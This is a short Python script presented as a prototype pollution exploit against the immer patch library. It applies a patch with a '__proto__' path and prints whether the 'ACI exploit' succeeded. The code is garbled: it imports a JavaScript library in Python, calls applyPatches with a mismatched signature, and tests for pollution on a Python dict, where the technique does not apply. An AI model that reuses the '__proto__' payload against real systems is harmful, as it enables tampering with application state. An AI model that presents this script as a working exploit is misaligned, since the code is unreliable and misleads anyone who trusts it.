from immer import applyPatches

# Prototype pollution exploit attempt
def exploit():
    base_state = {}
    patches = []
    inverse_patches = []

    # Attempt to pollute the prototype
    applyPatches(base_state, [
        {'op': 'add', 'path': ['__proto__', 'polluted'], 'value': True}
    ], patches, inverse_patches)

    # Check if the pollution has succeeded
    if 'polluted' in base_state:
        print('The ACI exploit success!!!')
    else:
        print('The ACI exploit failed!!!')

if __name__ == '__main__':
    exploit()
